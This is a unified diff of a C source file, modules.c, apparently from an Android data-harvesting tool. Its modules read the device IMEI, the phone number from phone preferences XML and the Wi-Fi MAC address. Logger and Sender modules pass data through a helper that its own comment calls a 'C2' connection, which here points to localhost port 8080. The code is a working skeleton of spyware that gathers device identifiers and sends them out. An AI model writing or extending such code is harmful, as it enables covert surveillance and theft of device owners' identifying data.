@@ -1,159 +1,188 @@
-#define _GNU_SOURCE
+/**
+ * @file modules.c
+ * @brief Business logic for extraction and networking modules.
+ */
 
 #include "modules.h"
-#include "../common/ipc/ipc.h"
-#include "../common/sal/symbol_resolver.h"
-#include <unistd.h>
-#include <string.h>
-#include <fcntl.h>
-#include <stdlib.h>
+#include "ipc.h"
+#include "symbol_resolver.h"
 #include <stdio.h>
-#include <time.h> 
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <signal.h>
 
-/* --- Helpers --- */
+// --- Static Helpers ---
 
-static char* read_file(const char* path) {
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) return NULL;
+/**
+ * @brief Safely read the first line of a file.
+ */
+static int read_file_line(const char* path, char* buffer, size_t size) {
+    FILE* f = fopen(path, "r");
+    if (!f) return 0;
     
-    size_t cap = 4096;
-    size_t len = 0;
-    char* buf = malloc(cap);
-
-    // Limit max file size to prevent OOM
-    while (buf && cap < (1024 * 1024)) {
-        ssize_t r = read(fd, buf + len, cap - len - 1);
-        if (r <= 0) break;
-        len += r;
-        if (len + 512 >= cap) buf = realloc(buf, cap *= 2);
+    if (fgets(buffer, (int)size, f) != NULL) {
+        buffer[strcspn(buffer, "\n")] = 0; // Trim newline
+        fclose(f);
+        return 1;
     }
-    
-    if (buf) buf[len] = 0;
-    close(fd);
-    return buf;
+    fclose(f);
+    return 0;
 }
 
-// Minimal XML extraction for <string name="key">value</string> or value="..."
-static int xml_scan(const char* xml, const char* key, char* out, size_t max) {
-    if (!xml || !key || !out || max == 0) return -1;
-    
-    char needle[128];
-    snprintf(needle, sizeof(needle), "name=\"%s\"", key);
-    
-    const char* p = strstr(xml, needle);
-    if (!p) return -1;
+/**
+ * @brief Write all data to a stream socket, handling EINTR.
+ */
+static ssize_t write_all(int fd, const void* buf, size_t count) {
+    size_t written = 0;
+    const char* ptr = buf;
+    while (written < count) {
+        ssize_t n = write(fd, ptr + written, count - written);
+        if (n <= 0) {
+            if (n < 0 && errno == EINTR) continue;
+            return -1;
+        }
+        written += n;
+    }
+    return written;
+}
 
-    // Check 1: value="..." attribute
-    const char* val_attr = strstr(p, "value=\"");
-    const char* close_tag = strchr(p, '>');
+/**
+ * @brief Centralized networking logic for Logger and Sender modules.
+ * Connects to C2, sends data, and optionally waits for ACK.
+ */
+static void perform_network_transmission(const char* data, int wait_for_ack) {
+    if (!data) return;
+
+    // CRITICAL: Ignore SIGPIPE. If server closes connection, do not crash child.
+    signal(SIGPIPE, SIG_IGN);
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return;
+
+    struct sockaddr_in server;
+    memset(&server, 0, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_port = htons(8080);
     
-    if (val_attr && close_tag && val_attr < close_tag) {
-        val_attr += 7; // Skip value="
-        size_t i = 0;
+    // Use localhost for this implementation
+    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
+        close(sock);
+        return;
+    }
+
+    // Connect with blocking call
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        close(sock);
+        return;
+    }
+
+    // Transmit Payload
+    write_all(sock, data, strlen(data));
+
+    // Optional ACK Logic
+    if (wait_for_ack) {
+        char ack[16];
+        // Set a receive timeout to prevent hanging forever
+        struct timeval tv = {2, 0};
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
         
-        // Manual copy with bounds checking on both source and dest
-        // Prevents reading past end of 'xml' string buffer if malformed
-        while (val_attr[i] && val_attr[i] != '"' && i < max - 1) {
-            out[i] = val_attr[i];
-            i++;
-        }
-        out[i] = 0;
-        return 0;
+        // Read ACK (We don't process the content in this version)
+        read(sock, ack, sizeof(ack)); 
     }
 
-    // Check 2: Inner text >value<
-    if (close_tag) {
-        const char* end_tag = strchr(close_tag, '<');
-        if (end_tag) {
-            size_t len = end_tag - (close_tag + 1);
-            if (len >= max) len = max - 1;
-            strncpy(out, close_tag + 1, len);
-            out[len] = 0;
-            return 0;
-        }
-    }
-    return -1;
+    close(sock);
 }
 
-/* --- Implementations --- */
+// --- Registry ---
 
-static void do_imei(int fd) {
-    LOG_I("ModIMEI", "Start");
-
-    ipc_packet_t req, resp = {0};
-    if (ipc_recv(fd, &req) < 0) return;
-
-    resp.head.type = MSG_RESP;
-    resp.head.sender = MOD_IMEI;
-    resp.head.req_id = req.head.req_id;
-
-    char buf[128] = {0};
-    // FIXME: Handle property lookup failure more gracefully?
-    if (sys->prop_get("ro.id.imei", buf) > 0) {
-        ipc_set_str(&resp, buf);
-    } else {
-        resp.head.status = -1;
-        ipc_set_str(&resp, "IMEI not found");
+module_entry_fn get_module_entry(int module_id) {
+    switch (module_id) {
+        case MOD_ID_IMEI:   return mod_imei_entry;
+        case MOD_ID_PHONE:  return mod_phone_entry;
+        case MOD_ID_MAC:    return mod_mac_entry;
+        case MOD_ID_LOGGER: return mod_logger_entry;
+        case MOD_ID_SENDER: return mod_sender_entry;
+        default: return NULL;
     }
-
-    ipc_send(fd, &resp);
 }
 
-static void do_phone(int fd) {
-    LOG_I("ModPhone", "Start");
+// --- Implementations ---
 
-    ipc_packet_t req, resp = {0};
-    if (ipc_recv(fd, &req) < 0) return;
+void mod_imei_entry(int socket_fd, const char* input_arg) {
+    (void)input_arg;
+    IpcResponse resp;
+    ipc_init_response(&resp);
 
-    resp.head.type = MSG_RESP;
-    resp.head.sender = MOD_PHONE;
-    resp.head.req_id = req.head.req_id;
-
-    // Hardcoded path for now.
-    // TODO: Move to config file.
-    char* xml = read_file("/data/data/com.android.phone/shared_prefs/com.android.phone_preferences.xml");
-    char val[256] = {0};
-
-    if (xml && xml_scan(xml, "phone_number_value", val, sizeof(val)) == 0) {
-        ipc_set_str(&resp, val);
-    } else {
-        resp.head.status = -1;
-        ipc_set_str(&resp, "Phone not found");
-    }
+    char prop_val[256] = {0};
+    // Try primary property
+    int len = sal_get_property("ro.id.imei", prop_val);
     
-    if (xml) free(xml);
-    ipc_send(fd, &resp);
+    // Try fallback property
+    if (len <= 0) len = sal_get_property("ro.ril.oem.imei", prop_val);
+
+    if (len > 0) ipc_set_data(&resp, prop_val);
+    else ipc_set_error(&resp, 1, "N/A");
+
+    ipc_send_packet(socket_fd, &resp);
 }
 
-static void do_net(int fd) {
-    LOG_I("ModNet", "Ready");
-    srand(time(0));
+void mod_phone_entry(int socket_fd, const char* input_arg) {
+    (void)input_arg;
+    IpcResponse resp;
+    ipc_init_response(&resp);
 
-    while (1) {
-        ipc_packet_t req, resp = {0};
-        if (ipc_recv(fd, &req) < 0) break;
-
-        resp.head.sender = MOD_NET;
-        resp.head.req_id = req.head.req_id;
-
-        if (req.head.type == MSG_LOG) {
-            LOG_I("NetLib", "UL Log: %s", req.data);
-        }
-        else if (req.head.type == MSG_REQ) {
-            char buf[128];
-            // Simulate network delay
-            usleep(50000); 
-            snprintf(buf, sizeof(buf), "ACK: %s (ID:%d)", req.data, rand() % 100);
-            
-            resp.head.type = MSG_RESP;
-            ipc_set_str(&resp, buf);
-            ipc_send(fd, &resp);
+    const char* target_file = "/data/local/tmp/prefs.xml"; 
+    char buffer[512];
+    
+    // Simple naive XML search
+    if (read_file_line(target_file, buffer, sizeof(buffer))) {
+        char* found = strstr(buffer, "number=\"");
+        if (found) {
+            found += 8; 
+            char* end = strchr(found, '"');
+            if (end) {
+                *end = '\0';
+                ipc_set_data(&resp, found);
+                ipc_send_packet(socket_fd, &resp);
+                return;
+            }
         }
     }
+    ipc_set_error(&resp, 1, "N/A");
+    ipc_send_packet(socket_fd, &resp);
 }
 
-const mod_def_t MODULES[MOD_COUNT] = {
-    { MOD_IMEI,  "IMEI",  TYPE_ONESHOT, 1001, 1001, "u:r:hub_imei:s0", do_imei },
-    { MOD_PHONE, "Phone", TYPE_ONESHOT, 1002, 1002, "u:r:hub_phone:s0", do_phone },
-    { MOD_NET,   "Net",   TYPE_SERVICE, 1003, 1003, "u:r:hub_net:s0",   do_net },
-};
+void mod_mac_entry(int socket_fd, const char* input_arg) {
+    (void)input_arg;
+    IpcResponse resp;
+    ipc_init_response(&resp);
+
+    char mac[128];
+    if (read_file_line("/sys/class/net/wlan0/address", mac, sizeof(mac))) {
+        ipc_set_data(&resp, mac);
+    } else {
+        ipc_set_error(&resp, 1, "N/A");
+    }
+    ipc_send_packet(socket_fd, &resp);
+}
+
+void mod_logger_entry(int socket_fd, const char* input_arg) {
+    (void)socket_fd; // Not used
+    if (!input_arg) return;
+    
+    char log_msg[512];
+    snprintf(log_msg, sizeof(log_msg), "LOG: %s\n", input_arg);
+    
+    perform_network_transmission(log_msg, 0); // No ACK
+}
+
+void mod_sender_entry(int socket_fd, const char* input_arg) {
+    (void)socket_fd; // Not used
+    perform_network_transmission(input_arg, 1); // Wait for ACK
+}
+
+
